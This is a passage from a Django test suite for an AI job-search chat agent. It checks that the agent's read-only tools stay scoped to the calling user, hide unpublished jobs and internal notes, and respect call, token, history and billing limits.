        # Explicit: psycopg_pool's default is deprecated and will flip to False.
        self.assertTrue(kwargs["open"])

    def test_real_checkpointer_is_blocked_under_test_settings(self):
        """Proves the guard: with no override_settings and no ConnectionPool
        patch, calling the real get_checkpointer() must fail loudly instead
        of silently opening a pool against config.DB_NAME (the developer's
        real database — Django's test runner does not rewrite that module
        constant to test_<db>)."""
        from apps.ai import checkpointer as cp
        with self.assertRaises(AssertionError):
            cp.get_checkpointer()


class CheckpointerSetupCommandTests(TestCase):
    def test_command_calls_setup_once(self):
        from io import StringIO
        from django.core.management import call_command
        # Patch where the name is LOOKED UP — the command module binds
        # get_checkpointer at import, so patching apps.ai.checkpointer would
        # only work while that module happens to be unimported.
        target = "apps.ai.management.commands.ai_checkpointer_setup.get_checkpointer"
        out = StringIO()
        with patch(target) as fake:
            call_command("ai_checkpointer_setup", stdout=out)
        fake.return_value.setup.assert_called_once_with()
        self.assertIn("checkpointer tables ready", out.getvalue().lower())


class _ChatToolFixture:
    """A seeker, a company, published jobs, plus unpublished and inactive ones."""

    def setUp(self):
        from apps.jobs.models import JobLocation, JobPost, JobPostSkillSet, JobType
        from apps.seekers.models import SeekerSkillSet, SkillSet

        self.seeker = UserAccount.objects.create_user(
            email="seeker@example.com", password="Str0ng-Password!", user_type="job_seeker")
        profile = self.seeker.seeker_profile
        profile.first_name, profile.last_name = "Ada", "Lovelace"
        profile.save()

        self.company_user = UserAccount.objects.create_user(
            email="hire@example.com", password="Str0ng-Password!", user_type="company")
        self.company = self.company_user.company_profile
        self.company.company_name = "Acme"
        self.company.save()

        self.job_type = JobType.objects.create(job_type_name="Full Time")
        self.location = JobLocation.objects.create(city="Berlin", country="Germany")

        self.python = SkillSet.objects.create(skill_name="Python")
        self.django_skill = SkillSet.objects.create(skill_name="Django")
        self.rust = SkillSet.objects.create(skill_name="Rust")

        SeekerSkillSet.objects.create(
            user_account=self.seeker, skill_set=self.python, skill_level="Advanced")
        SeekerSkillSet.objects.create(
            user_account=self.seeker, skill_set=self.django_skill, skill_level="Intermediate")

        self.job = JobPost.objects.create(
            company=self.company, job_type=self.job_type, job_location=self.location,
            job_title="Senior Python Developer",
            job_description="Build APIs with Django.",
            job_description_hidden="SECRET internal budget notes",
            is_published=True, is_active=True)
        JobPostSkillSet.objects.create(
            job_post=self.job, skill_set=self.python, skill_level="Advanced", is_required=True)
        JobPostSkillSet.objects.create(
            job_post=self.job, skill_set=self.rust, skill_level="Advanced", is_required=True)

        self.other_job = JobPost.objects.create(
            company=self.company, job_type=self.job_type, job_location=self.location,
            job_title="Rust Engineer", job_description="Systems work.",
            is_published=True, is_active=True)
        self.unpublished = JobPost.objects.create(
            company=self.company, job_type=self.job_type, job_location=self.location,
            job_title="Stealth Role", job_description="Not announced yet.",
            is_published=False, is_active=True)
        self.inactive = JobPost.objects.create(
            company=self.company, job_type=self.job_type, job_location=self.location,
            job_title="Closed Role", job_description="Filled.",
            is_published=True, is_active=False)

    def _tools(self, user=None):
        from apps.ai.tools import build_tools
        return {t.name: t for t in build_tools(user or self.seeker)}


class BuildToolsTests(_ChatToolFixture, TestCase):
    def test_exposes_exactly_the_four_read_only_tools(self):
        from apps.ai.tools import build_tools
        self.assertEqual([t.name for t in build_tools(self.seeker)],
                         ["search_jobs", "get_job_details", "get_my_profile", "compare_fit"])

    def test_no_tool_accepts_a_user_id(self):
        """Closures over the user, never an LLM-supplied identity."""
        from apps.ai.tools import build_tools
        for tool in build_tools(self.seeker):
            for arg in tool.args:
                self.assertNotIn("user", arg.lower(), f"{tool.name} exposes {arg}")


class SearchJobsToolTests(_ChatToolFixture, TestCase):
    def test_returns_published_active_jobs(self):
        self.assertIn("Senior Python Developer",
                      self._tools()["search_jobs"].invoke({"keywords": "python"}))

    def test_never_returns_unpublished_or_inactive_jobs(self):
        out = self._tools()["search_jobs"].invoke({"keywords": ""})
        self.assertNotIn("Stealth Role", out)
        self.assertNotIn("Closed Role", out)

    def test_never_leaks_hidden_description(self):
        self.assertNotIn("SECRET",
                         self._tools()["search_jobs"].invoke({"keywords": "python"}))

    def test_filters_by_city(self):
        tool = self._tools()["search_jobs"]
        self.assertIn("Senior Python Developer",
                      tool.invoke({"keywords": "", "city": "Berlin"}))
        self.assertIn("No matching", tool.invoke({"keywords": "", "city": "Lisbon"}))

    def test_result_count_is_capped(self):
        from apps.jobs.models import JobPost
        from apps.ai.tools import MAX_SEARCH_RESULTS
        for i in range(MAX_SEARCH_RESULTS + 5):
            JobPost.objects.create(
                company=self.company, job_type=self.job_type, job_location=self.location,
                job_title=f"Extra Python Role {i}", job_description="x",
                is_published=True, is_active=True)
        out = self._tools()["search_jobs"].invoke({"keywords": "python"})
        self.assertLessEqual(out.count("- id="), MAX_SEARCH_RESULTS)

    def test_empty_result_is_explicit(self):
        self.assertIn("No matching",
                      self._tools()["search_jobs"].invoke({"keywords": "cobol"}))

    def test_query_budget(self):
        """8 matching published jobs, each with its own skills — dropping
        with_related() would add ~3 queries per job (company, job_location,
        job_type) and blow the ceiling; a couple of skill rows per job also
        load the shared with_related() prefetch."""
        from django.db import connection
        from django.test.utils import CaptureQueriesContext
        from apps.jobs.models import JobPost, JobPostSkillSet
        for i in range(8):
            job = JobPost.objects.create(
                company=self.company, job_type=self.job_type, job_location=self.location,
                job_title=f"Python Role {i}", job_description="x",
                is_published=True, is_active=True)
            JobPostSkillSet.objects.create(
                job_post=job, skill_set=self.python, skill_level="Advanced", is_required=True)
            JobPostSkillSet.objects.create(
                job_post=job, skill_set=self.rust, skill_level="Advanced", is_required=True)
        tool = self._tools()["search_jobs"]
        with CaptureQueriesContext(connection) as ctx:
            tool.invoke({"keywords": "python"})
        self.assertLessEqual(len(ctx), 10)


class GetJobDetailsToolTests(_ChatToolFixture, TestCase):
    def test_returns_details_including_required_skills(self):
        out = self._tools()["get_job_details"].invoke({"job_post_id": str(self.job.id)})
        self.assertIn("Acme", out)
        # Assert on a token only the skills section can produce — plain "Python"
        # also appears in the job title, so it would pass for the wrong reason.
        self.assertIn("Python (Advanced, required)", out)
        self.assertIn("Rust", out)

    def test_never_leaks_hidden_description(self):
        self.assertNotIn("SECRET", self._tools()["get_job_details"].invoke(
            {"job_post_id": str(self.job.id)}))

    def test_unpublished_job_is_not_found(self):
        self.assertIn("not found", self._tools()["get_job_details"].invoke(
            {"job_post_id": str(self.unpublished.id)}).lower())

    def test_inactive_job_is_not_found(self):
        self.assertIn("not found", self._tools()["get_job_details"].invoke(
            {"job_post_id": str(self.inactive.id)}).lower())

    def test_unknown_id_returns_not_found_not_an_exception(self):
        self.assertIn("not found", self._tools()["get_job_details"].invoke(
            {"job_post_id": "00000000-0000-0000-0000-000000000000"}).lower())

    def test_malformed_id_returns_not_found_not_an_exception(self):
        """The model will invent ids. A ValueError here would 500 the request."""
        self.assertIn("not found", self._tools()["get_job_details"].invoke(
            {"job_post_id": "not-a-uuid"}).lower())

    def test_description_is_length_capped(self):
        from apps.ai.tools import MAX_TOOL_DESCRIPTION_CHARS
        self.job.job_description = "y" * (MAX_TOOL_DESCRIPTION_CHARS + 500)
        self.job.save()
        out = self._tools()["get_job_details"].invoke({"job_post_id": str(self.job.id)})
        self.assertLess(out.count("y"), MAX_TOOL_DESCRIPTION_CHARS + 100)

    def test_skills_list_is_capped(self):
        """A company can attach one JobPostSkillSet row per catalog SkillSet
        with no per-job count cap — the rendered list must not grow with it."""
        from apps.ai.tools import MAX_JOB_SKILLS
        from apps.jobs.models import JobPostSkillSet
        from apps.seekers.models import SkillSet
        for i in range(MAX_JOB_SKILLS + 5):
            skill = SkillSet.objects.create(skill_name=f"ExtraSkill{i}")
            JobPostSkillSet.objects.create(
                job_post=self.job, skill_set=skill, skill_level="Advanced", is_required=True)
        out = self._tools()["get_job_details"].invoke({"job_post_id": str(self.job.id)})
        # self.job already has 2 required skills (Python, Rust) from setUp;
        # + MAX_JOB_SKILLS + 5 more = well past the cap. Every entry created
        # here renders as "..., required)" — count them, don't guess.
        self.assertEqual(out.count(", required)"), MAX_JOB_SKILLS)


class GetMyProfileToolTests(_ChatToolFixture, TestCase):
    def test_returns_the_bound_users_profile(self):
        out = self._tools()["get_my_profile"].invoke({})
        self.assertIn("Ada Lovelace", out)
        self.assertIn("Python", out)

    def test_takes_no_arguments(self):
        self.assertEqual(self._tools()["get_my_profile"].args, {})

    def test_is_bound_to_the_user_passed_to_build_tools(self):
        """Two seekers, two tool sets, no crosstalk."""
        other = UserAccount.objects.create_user(
            email="other@example.com", password="Str0ng-Password!", user_type="job_seeker")
        other.seeker_profile.first_name = "Grace"
        other.seeker_profile.last_name = "Hopper"
        other.seeker_profile.save()
        mine = self._tools()["get_my_profile"].invoke({})
        theirs = self._tools(other)["get_my_profile"].invoke({})
        self.assertIn("Ada Lovelace", mine)
        self.assertNotIn("Grace Hopper", mine)
        self.assertIn("Grace Hopper", theirs)
        self.assertNotIn("Ada Lovelace", theirs)

    def test_never_includes_the_users_email(self):
        self.assertNotIn("seeker@example.com",
                         self._tools()["get_my_profile"].invoke({}))

    def test_query_budget(self):
        """8 skill rows plus several education/experience rows — skills join
        skill_set, and without select_related each relation is an N+1 that
        this row count is large enough to actually breach the ceiling with."""
        from django.db import connection
        from django.test.utils import CaptureQueriesContext
        from apps.seekers.models import EducationData, ExperienceData, SeekerSkillSet, SkillSet
        for i in range(8):
            skill = SkillSet.objects.create(skill_name=f"ProfileSkill{i}")
            SeekerSkillSet.objects.create(
                user_account=self.seeker, skill_set=skill, skill_level="Advanced")
        for i in range(5):
            EducationData.objects.create(
                user_account=self.seeker, institute_university_name=f"University {i}",
                degree_type="Bachelor", field_of_study="Computer Science")
        for i in range(5):
            ExperienceData.objects.create(
                user_account=self.seeker, company_name=f"Company {i}", position="Engineer")
        tool = self._tools()["get_my_profile"]
        with CaptureQueriesContext(connection) as ctx:
            tool.invoke({})
        self.assertLessEqual(len(ctx), 10)


class CompareFitToolTests(_ChatToolFixture, TestCase):
    def test_reports_matched_and_missing_skills(self):
        out = self._tools()["compare_fit"].invoke({"job_post_id": str(self.job.id)})
        self.assertIn("Matched: Python", out)
        self.assertIn("Missing: Rust", out)
        self.assertIn("1 of 2", out)

    def test_overlap_is_computed_in_python_not_guessed(self):
        """Deterministic arithmetic — the agent only narrates the result."""
        self.assertIn("0 of 0", self._tools()["compare_fit"].invoke(
            {"job_post_id": str(self.other_job.id)}))

    def test_unpublished_job_is_not_found(self):
        self.assertIn("not found", self._tools()["compare_fit"].invoke(
            {"job_post_id": str(self.unpublished.id)}).lower())

    def test_inactive_job_is_not_found(self):
        self.assertIn("not found", self._tools()["compare_fit"].invoke(
            {"job_post_id": str(self.inactive.id)}).lower())

    def test_malformed_id_returns_not_found(self):
        self.assertIn("not found",
                      self._tools()["compare_fit"].invoke({"job_post_id": "nope"}).lower())

    def test_required_skill_total_is_capped(self):
        """Same unbounded-JobPostSkillSet risk as get_job_details: the
        Matched/Missing totals must stay bounded by MAX_JOB_SKILLS."""
        from apps.ai.tools import MAX_JOB_SKILLS
        from apps.jobs.models import JobPostSkillSet
        from apps.seekers.models import SkillSet
        for i in range(MAX_JOB_SKILLS + 5):
            skill = SkillSet.objects.create(skill_name=f"ExtraSkill{i}")
            JobPostSkillSet.objects.create(
                job_post=self.job, skill_set=skill, skill_level="Advanced", is_required=True)
        out = self._tools()["compare_fit"].invoke({"job_post_id": str(self.job.id)})
        self.assertIn(f"of {MAX_JOB_SKILLS} listed skills", out)


class ChatPromptTests(TestCase):
    def test_system_prompt_states_the_role(self):
        from apps.ai.prompts import CHAT_SYSTEM
        self.assertIn("job", CHAT_SYSTEM.lower())

    def test_system_prompt_carries_a_prompt_injection_guard(self):
        """Job descriptions are company-authored untrusted text."""
        from apps.ai.prompts import CHAT_SYSTEM
        lowered = CHAT_SYSTEM.lower()
        self.assertIn("instruction", lowered)
        self.assertIn("job post", lowered)

    def test_system_prompt_forbids_promising_to_apply(self):
        from apps.ai.prompts import CHAT_SYSTEM
        self.assertIn("apply", CHAT_SYSTEM.lower())


class GetModelOptionTests(TestCase):
    def test_default_timeout_unchanged(self):
        """Not a RED test — llm.py already hardcodes 30. It guards the default
        while the signature grows new keyword arguments."""
        from apps.ai.llm import get_model
        self.assertEqual(get_model('flash').timeout, 30)

    def test_timeout_is_overridable_for_the_agent_loop(self):
        from apps.ai.llm import get_model
        self.assertEqual(get_model('pro', timeout=60).timeout, 60)

    def test_output_token_cap_is_overridable(self):
        """The spec's fourth bound: one runaway completion is unbounded spend."""
        from apps.ai.llm import get_model
        self.assertEqual(get_model('pro', max_output_tokens=1024).max_output_tokens, 1024)


class ScriptedFakeChatModelTests(TestCase):
    def test_supports_bind_tools_unlike_the_structured_fake(self):
        from apps.ai.testing import ScriptedFakeChatModel
        model = ScriptedFakeChatModel(responses=[])
        self.assertIs(model.bind_tools([]), model)

    def test_pops_one_response_per_call(self):
        from langchain_core.messages import AIMessage
        from apps.ai.testing import ScriptedFakeChatModel
        model = ScriptedFakeChatModel(
            responses=[AIMessage(content="one"), AIMessage(content="two")])
        self.assertEqual(model.invoke("x").content, "one")
        self.assertEqual(model.invoke("x").content, "two")

    def test_scripted_exception_is_raised(self):
        from apps.ai.testing import ScriptedFakeChatModel
        model = ScriptedFakeChatModel(responses=[RuntimeError("provider down")])
        with self.assertRaises(RuntimeError):
            model.invoke("x")

    def test_drives_a_real_create_agent_loop_offline(self):
        """The whole point: a tool call and a final answer, with no network."""
        from langchain.agents import create_agent
        from langchain_core.messages import AIMessage
        from langchain_core.tools import tool
        from langgraph.checkpoint.memory import InMemorySaver
        from apps.ai.testing import ScriptedFakeChatModel

        @tool
        def echo(text: str) -> str:
            """Echo the text back."""
            return f"echoed {text}"

        model = ScriptedFakeChatModel(responses=[
            AIMessage(content="", tool_calls=[
                {"name": "echo", "args": {"text": "hi"}, "id": "c1"}]),
            AIMessage(content="I echoed it."),
        ])
        agent = create_agent(model, tools=[echo], checkpointer=InMemorySaver())
        out = agent.invoke({"messages": [("user", "go")]},
                           config={"configurable": {"thread_id": "t1"}})
        self.assertEqual(out["messages"][-1].content, "I echoed it.")
        self.assertIn("echoed hi", [m.content for m in out["messages"]])

    def test_reports_usage_metadata_for_billing(self):
        from langchain_core.messages import AIMessage
        from apps.ai.testing import ScriptedFakeChatModel
        model = ScriptedFakeChatModel(responses=[
            AIMessage(content="hi", usage_metadata={
                "input_tokens": 11, "output_tokens": 3, "total_tokens": 14})])
        self.assertEqual(model.invoke("x").usage_metadata["input_tokens"], 11)


class _ChatServiceFixture(_ChatToolFixture):
    def _saver(self):
        from langgraph.checkpoint.memory import InMemorySaver
        return InMemorySaver()

    def _reply(self, text, *, tokens=(100, 20)):
        from langchain_core.messages import AIMessage
        return AIMessage(content=text, usage_metadata={
            "input_tokens": tokens[0], "output_tokens": tokens[1],
            "total_tokens": sum(tokens)})

    def _toolcall(self, name, args, *, tokens=(10, 5), call_id="call-1"):
        from langchain_core.messages import AIMessage
        return AIMessage(content="", tool_calls=[
            {"name": name, "args": args, "id": call_id}], usage_metadata={
            "input_tokens": tokens[0], "output_tokens": tokens[1],
            "total_tokens": sum(tokens)})

    def _send(self, message, *, responses, conversation_id=None, user=None,
              checkpointer=None):
        from apps.ai.services import send_chat_message
        from apps.ai.testing import ScriptedFakeChatModel
        return send_chat_message(
            user or self.seeker, message=message, conversation_id=conversation_id,
            model=ScriptedFakeChatModel(responses=responses),
            checkpointer=checkpointer or self._saver())


class SendChatMessageTests(_ChatServiceFixture, TestCase):
    # --- conversation lifecycle ---------------------------------------------

    def test_creates_conversation_and_returns_id_and_reply(self):
        from apps.ai.models import Conversation
        out = self._send("find python jobs", responses=[self._reply("Here are some.")])
        self.assertEqual(out["reply"], "Here are some.")
        self.assertEqual(Conversation.objects.count(), 1)
        self.assertEqual(out["conversation_id"], str(Conversation.objects.get().id))

    def test_title_is_first_message_truncated_to_60_chars(self):
        from apps.ai.models import Conversation
        from apps.ai.services import CONVERSATION_TITLE_CHARS
        self._send("z" * 200, responses=[self._reply("ok")])
        title = Conversation.objects.get().title
        self.assertEqual(len(title), CONVERSATION_TITLE_CHARS)
        self.assertEqual(title, "z" * CONVERSATION_TITLE_CHARS)

    def test_title_is_set_once_and_never_rewritten(self):
        from apps.ai.models import Conversation
        saver = self._saver()
        first = self._send("original title", responses=[self._reply("a")],
                           checkpointer=saver)
        self._send("a completely different second message",
                   responses=[self._reply("b")],
                   conversation_id=first["conversation_id"], checkpointer=saver)
        self.assertEqual(Conversation.objects.get().title, "original title")

    def test_continuing_a_conversation_reuses_the_id(self):
        saver = self._saver()
        first = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
        second = self._send("again", responses=[self._reply("yes")],
                            conversation_id=first["conversation_id"], checkpointer=saver)
        self.assertEqual(first["conversation_id"], second["conversation_id"])

    def test_history_persists_across_turns(self):
        saver = self._saver()
        first = self._send("remember this", responses=[self._reply("noted")],
                           checkpointer=saver)
        self._send("and this", responses=[self._reply("noted again")],
                   conversation_id=first["conversation_id"], checkpointer=saver)
        stored = saver.get_tuple(
            {"configurable": {"thread_id": first["conversation_id"]}}
        ).checkpoint["channel_values"]["messages"]
        self.assertEqual(len(stored), 4)

    # --- ownership -----------------------------------------------------------

    def test_another_users_conversation_is_not_found(self):
        from apps.ai.exceptions import ConversationNotFoundError
        from apps.ai.models import Conversation
        intruder = UserAccount.objects.create_user(
            email="nosy@example.com", password="Str0ng-Password!", user_type="job_seeker")
        mine = Conversation.objects.create(user=self.seeker, title="private")
        with self.assertRaises(ConversationNotFoundError):
            self._send("who are you talking to", responses=[self._reply("x")],
                       conversation_id=str(mine.id), user=intruder)

    def test_unknown_conversation_id_raises_not_found(self):
        from apps.ai.exceptions import ConversationNotFoundError
        with self.assertRaises(ConversationNotFoundError):
            self._send("hi", responses=[self._reply("x")],
                       conversation_id="00000000-0000-0000-0000-000000000000")

    def test_malformed_conversation_id_raises_not_found_not_500(self):
        from apps.ai.exceptions import ConversationNotFoundError
        with self.assertRaises(ConversationNotFoundError):
            self._send("hi", responses=[self._reply("x")], conversation_id="not-a-uuid")

    # --- the agent loop ------------------------------------------------------

    def test_agent_can_call_a_tool_and_answer(self):
        out = self._send("any python roles?", responses=[
            self._toolcall("search_jobs", {"keywords": "python"}),
            self._reply("Yes — Senior Python Developer."),
        ])
        self.assertEqual(out["reply"], "Yes — Senior Python Developer.")

    def test_uses_the_pro_tier_with_the_agent_timeout_and_output_cap(self):
        """Every other test injects a fake, so nothing else would catch a
        regression of the tier, the raised timeout, or the output cap."""
        from apps.ai.services import (CHAT_MAX_OUTPUT_TOKENS,
                                      CHAT_MODEL_TIMEOUT_SECONDS,
                                      send_chat_message)
        from apps.ai.testing import ScriptedFakeChatModel
        with patch("apps.ai.services.get_model") as mocked:
            mocked.return_value = ScriptedFakeChatModel(responses=[self._reply("ok")])
            send_chat_message(self.seeker, message="hi", checkpointer=self._saver())
        mocked.assert_called_once_with(
            'pro', timeout=CHAT_MODEL_TIMEOUT_SECONDS,
            max_output_tokens=CHAT_MAX_OUTPUT_TOKENS)

    # --- billing -------------------------------------------------------------

    def test_logs_exactly_one_usage_row_per_turn(self):
        from apps.ai.models import AIUsageLog
        self._send("hi", responses=[
            self._toolcall("search_jobs", {"keywords": "python"}),
            self._reply("done")])
        self.assertEqual(AIUsageLog.objects.filter(feature="chat").count(), 1)

    def test_usage_row_sums_tokens_across_the_whole_turn(self):
        from apps.ai.models import AIUsageLog
        self._send("hi", responses=[
            self._toolcall("search_jobs", {"keywords": "python"}, tokens=(10, 5)),
            self._reply("done", tokens=(100, 20))])
        row = AIUsageLog.objects.get(feature="chat")
        self.assertEqual(row.input_tokens, 110)
        self.assertEqual(row.output_tokens, 25)

    def test_second_turn_does_not_rebill_the_first(self):
        """invoke() returns the FULL history; naive summing double-bills."""
        from apps.ai.models import AIUsageLog
        saver = self._saver()
        first = self._send("turn one", responses=[self._reply("a", tokens=(100, 40))],
                           checkpointer=saver)
        self._send("turn two", responses=[self._reply("b", tokens=(500, 7))],
                   conversation_id=first["conversation_id"], checkpointer=saver)
        rows = AIUsageLog.objects.filter(feature="chat").order_by("created_at")
        self.assertEqual([(r.input_tokens, r.output_tokens) for r in rows],
                         [(100, 40), (500, 7)])

    def test_a_turn_that_hits_the_call_bound_still_writes_a_usage_row(self):
        """Eight Pro calls were billed by the provider before the bound fired.
        Losing that row hides real, user-triggerable spend. The exact tuple
        pins the value to 8 calls x (10, 5) tokens each — an implementation
        that (incorrectly) billed the entire thread on the failure path would
        also clear a merely-positive assertion."""
        from apps.ai.exceptions import AgentLimitExceededError
        from apps.ai.models import AIUsageLog
        from apps.ai.services import MAX_MODEL_CALLS_PER_TURN
        responses = [self._toolcall("search_jobs", {"keywords": "x"}, call_id=f"c{i}")
                     for i in range(MAX_MODEL_CALLS_PER_TURN + 2)]
        with self.assertRaises(AgentLimitExceededError):
            self._send("loop forever", responses=responses)
        row = AIUsageLog.objects.get(feature="chat")
        self.assertEqual((row.input_tokens, row.output_tokens), (80, 40))

    # --- bounds --------------------------------------------------------------

    def test_per_turn_call_bound_raises_agent_limit_exceeded(self):
        """exit_behavior='error'; the default 'end' would return the string
        'Model call limits exceeded: run limit (8/8)' to the user as a reply."""
        from apps.ai.exceptions import AgentLimitExceededError
        from apps.ai.services import MAX_MODEL_CALLS_PER_TURN
        responses = [self._toolcall("search_jobs", {"keywords": "x"}, call_id=f"c{i}")
                     for i in range(MAX_MODEL_CALLS_PER_TURN + 2)]
        with self.assertRaises(AgentLimitExceededError) as ctx:
            self._send("loop forever", responses=responses)
        # The library's synthetic message must never become the user's reply.
        self.assertNotIn("limits exceeded", str(ctx.exception).lower())

    def test_lifetime_thread_bound_raises_conversation_exhausted(self):
        """thread_limit is checkpointed and cumulative: once hit, EVERY later
        turn raises. That is not a timeout and must not be reported as one."""
        from apps.ai.exceptions import ConversationExhaustedError
        from apps.ai.services import MAX_MODEL_CALLS_PER_THREAD
        saver = self._saver()
        out = self._send("first", responses=[self._reply("hi")], checkpointer=saver)
        cid = out["conversation_id"]
        with patch("apps.ai.services.MAX_MODEL_CALLS_PER_THREAD", 1):
            with self.assertRaises(ConversationExhaustedError):
                self._send("second", responses=[self._reply("hi again")],
                           conversation_id=cid, checkpointer=saver)
        self.assertGreater(MAX_MODEL_CALLS_PER_THREAD, 1)

    def test_deadline_raises_agent_limit_exceeded(self):
        from apps.ai.exceptions import AgentLimitExceededError
        with patch("apps.ai.services.CHAT_DEADLINE_SECONDS", -1):
            with self.assertRaises(AgentLimitExceededError):
                self._send("hi", responses=[self._reply("never reached")])

    def test_history_sent_to_the_model_is_capped(self):
        """Full history stays in the checkpoint; the model's view is trimmed.
        A @before_model hook cannot do this — add_messages appends.

        Counts NON-SYSTEM messages only: create_agent prepends the system
        prompt after middleware runs, so it is never part of the trimmed list.
        """
        from langchain_core.messages import SystemMessage
        from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
        from apps.ai.testing import ScriptedFakeChatModel

        seen = []

        class _Recording(ScriptedFakeChatModel):
            def _generate(self, messages, stop=None, run_manager=None, **kwargs):
                seen.append(sum(1 for m in messages
                                if not isinstance(m, SystemMessage)))
                return super()._generate(messages, stop, run_manager, **kwargs)

        saver = self._saver()
        conversation_id = None
        for turn in range(CHAT_HISTORY_MESSAGES):
            out = send_chat_message(
                self.seeker, message=f"turn {turn}", conversation_id=conversation_id,
                model=_Recording(responses=[self._reply(f"r{turn}")]),
                checkpointer=saver)
            conversation_id = out["conversation_id"]
        self.assertLessEqual(max(seen), CHAT_HISTORY_MESSAGES)
        # len(seen) is always CHAT_HISTORY_MESSAGES (one model call per turn),
        # regardless of whether trimming works — that tells us nothing. What
        # must actually be true: history grew close to the cap before being
        # trimmed back down, i.e. trimming was genuinely exercised rather
        # than the window merely never reaching the cap in the first place.
        self.assertGreater(max(seen), CHAT_HISTORY_MESSAGES // 2)

    def test_trimming_never_orphans_a_tool_message(self):
        """A raw tail slice starts the window on a ToolMessage whose parent
        AIMessage was cut. Gemini rejects a functionResponse with no preceding
        functionCall, so such a turn 502s — invisible to a fake model unless
        asserted directly.

        Uses THREE PARALLEL tool calls per turn (6 messages/turn: Human,
        AI+3 tool_calls, Tool x3, AI) rather than one. With single tool calls
        (4 messages/turn, a divisor of CHAT_HISTORY_MESSAGES=20) the trim
        boundary always happens to land exactly on a turn boundary, so a
        naive last-N slice never actually orphans anything in that shape and
        this test would pass even against a broken implementation — verified
        empirically by temporarily monkeypatching apps.ai.services.trim_messages
        to a raw slice (see the task-5 fix report for the before/after proof).
        Three parallel calls breaks that coincidental alignment.
        """
        from langchain_core.messages import AIMessage, SystemMessage, ToolMessage
        from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
        from apps.ai.testing import ScriptedFakeChatModel

        windows = []

        class _Recording(ScriptedFakeChatModel):
            def _generate(self, messages, stop=None, run_manager=None, **kwargs):
                windows.append([m for m in messages
                                if not isinstance(m, SystemMessage)])
                return super()._generate(messages, stop, run_manager, **kwargs)

        def _parallel_toolcalls(turn, n=3):
            from langchain_core.messages import AIMessage as _AIMessage
            return _AIMessage(content="", tool_calls=[
                {"name": "search_jobs", "args": {"keywords": "python"},
                 "id": f"c{turn}-{i}"} for i in range(n)],
                usage_metadata={"input_tokens": 10, "output_tokens": 5,
                                "total_tokens": 15})

        def _first_orphaned_tool_message(window):
            """Walk back over runs of consecutive ToolMessages (produced by
            parallel tool calls) to find the true parent — the immediately
            preceding message is only the parent for the FIRST ToolMessage
            in such a run; checking window[i - 1] naively for every
            ToolMessage is itself wrong for parallel calls and would flag
            perfectly well-formed windows as orphaned."""
            i = 0
            while i < len(window):
                if isinstance(window[i], ToolMessage):
                    start = i
                    while start > 0 and isinstance(window[start - 1], ToolMessage):
                        start -= 1
                    parent = window[start - 1] if start > 0 else None
                    if not (isinstance(parent, AIMessage) and parent.tool_calls):
                        return window[i]
                    while i < len(window) and isinstance(window[i], ToolMessage):
                        i += 1
                    continue
                i += 1
            return None

        saver = self._saver()
        conversation_id = None
        for turn in range(CHAT_HISTORY_MESSAGES):
            out = send_chat_message(
                self.seeker, message=f"turn {turn}", conversation_id=conversation_id,
                model=_Recording(responses=[
                    _parallel_toolcalls(turn), self._reply(f"r{turn}")]),
                checkpointer=saver)
            conversation_id = out["conversation_id"]

        for window in windows:
            self.assertIsNone(_first_orphaned_tool_message(window),
                              "orphaned ToolMessage in the model's window")

    def test_oversized_single_turn_never_sends_the_model_an_empty_window(self):
        """CRITICAL fix-round finding: trim_messages(..., start_on='human')
        returns [] when the CURRENT turn alone is already longer than
        CHAT_HISTORY_MESSAGES, because start_on='human' finds no HumanMessage
        inside the trimmed tail — the turn's own HumanMessage has already
        fallen outside the window. Without the `if not trimmed:` fallback in
        _trim_history, request.override(messages=[]) then calls the model
        with only the system prompt; real Gemini rejects empty `contents`
        with a 400 (-> AIProviderError, a 502) on an ORDINARY turn, not an
        edge case.

        Two rounds of 12 parallel tool_calls each (Human + AI+12 Tool, twice)
        comfortably clears CHAT_HISTORY_MESSAGES=20 in 3 model calls — well
        under MAX_MODEL_CALLS_PER_TURN=8. Sequential single tool calls could
        never reach this: 7 rounds (the most the 8-call bound allows before a
        final reply) is only 1 + 2*7 + 1 = 16 messages, never enough to
        trigger the bug. Parallel calls are what make a single turn outgrow
        the window.
        """
        from langchain_core.messages import AIMessage, HumanMessage, SystemMessage
        from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
        from apps.ai.testing import ScriptedFakeChatModel

        windows = []

        class _Recording(ScriptedFakeChatModel):
            def _generate(self, messages, stop=None, run_manager=None, **kwargs):
                windows.append([m for m in messages
                                if not isinstance(m, SystemMessage)])
                return super()._generate(messages, stop, run_manager, **kwargs)

        def _parallel_round(round_num, n=12):
            return AIMessage(content="", tool_calls=[
                {"name": "search_jobs", "args": {"keywords": "python"},
                 "id": f"r{round_num}-{i}"} for i in range(n)],
                usage_metadata={"input_tokens": 10, "output_tokens": 5,
                                "total_tokens": 15})

        model = _Recording(responses=[
            _parallel_round(1), _parallel_round(2), self._reply("Here you go.")])
        out = send_chat_message(
            self.seeker, message="find me every python job you can",
            model=model, checkpointer=self._saver())

        self.assertEqual(out["reply"], "Here you go.")
        # Proves the fallback actually engaged (not just that trimming ran):
        # a correctly-trimmed window can never exceed the cap, so a window
        # bigger than CHAT_HISTORY_MESSAGES only happens via the whole-turn
        # fallback.
        self.assertGreater(max(len(w) for w in windows), CHAT_HISTORY_MESSAGES,
                           "fallback never engaged — test setup didn't "
                           "actually exceed the window")
        for window in windows:
            self.assertGreater(
                len(window), 0,
                "model was called with zero non-system messages — Gemini "
                "rejects empty contents with a 400")
            self.assertIsInstance(
                window[0], HumanMessage,
                "model's first message was not a HumanMessage")

    # --- provider failures ---------------------------------------------------

    def test_provider_error_is_classified(self):
        from apps.ai.exceptions import AIProviderError
        with self.assertRaises(AIProviderError):
            self._send("hi", responses=[RuntimeError("503 backend unavailable")])

    def test_quota_error_is_classified(self):
        from apps.ai.exceptions import AIQuotaExceededError
        with self.assertRaises(AIQuotaExceededError):
            self._send("hi", responses=[RuntimeError("RESOURCE_EXHAUSTED")])

    def test_failed_first_turn_rolls_back_the_new_conversation(self):
        """Otherwise a retry loop leaves one empty conversation per attempt."""
        from apps.ai.exceptions import AIProviderError
        from apps.ai.models import Conversation
        with self.assertRaises(AIProviderError):
            self._send("hi", responses=[RuntimeError("503 backend unavailable")])
        self.assertEqual(Conversation.objects.count(), 0)

    def test_failure_on_an_existing_conversation_never_deletes_it(self):
        from apps.ai.exceptions import AIProviderError
        from apps.ai.models import Conversation
        saver = self._saver()
        first = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
